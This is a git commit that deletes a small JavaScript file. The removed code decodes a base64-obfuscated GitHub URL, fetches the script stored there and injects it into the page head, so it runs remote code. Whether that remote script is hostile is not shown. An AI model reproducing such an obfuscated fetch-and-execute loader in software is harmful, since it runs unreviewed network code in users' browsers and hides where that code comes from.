08029bd826d9997e1550664df23c45d54f797b4b
BCM <76426562+BCMS7@users.noreply.github.com>
2023-03-13 01:15:37 +0800

    Delete fetch.js

--- fetch.js
+++
@@ -1,7 +0,0 @@
-fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JDTVM3L0JDTS9tYWluL0JDTUUxLmpz'))
-.then(response => response.text())
-.then(text => {
-const script = document.createElement('script');
-script.innerHTML = text;
-document.head.appendChild(script);
-  })
